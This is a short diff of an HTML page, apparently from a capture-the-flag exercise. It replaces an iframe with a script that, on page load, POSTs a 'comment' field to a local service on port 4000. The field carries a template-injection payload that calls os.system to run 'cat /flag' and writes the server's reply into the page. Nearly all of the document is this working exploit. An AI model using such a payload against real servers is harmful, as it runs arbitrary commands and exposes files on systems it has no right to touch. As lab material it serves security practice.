@@ -1,4 +1,10 @@
 <!doctype html>
 <meta charset="utf-8">
-<style>html,body,iframe{margin:0;width:100vw;height:100vh;border:0}</style>
-<iframe src="http://127.0.0.1:4000/"></iframe>
+<script>
+  fetch("http://127.0.0.1:4000/", {
+    method: "POST",
+    headers: {"Content-Type":"application/x-www-form-urlencoded"},
+    body: "comment={{__import__('os').system('cat /flag')}}"
+  }).then(r => r.text())
+    .then(t => document.body.innerHTML = t);
+</script>
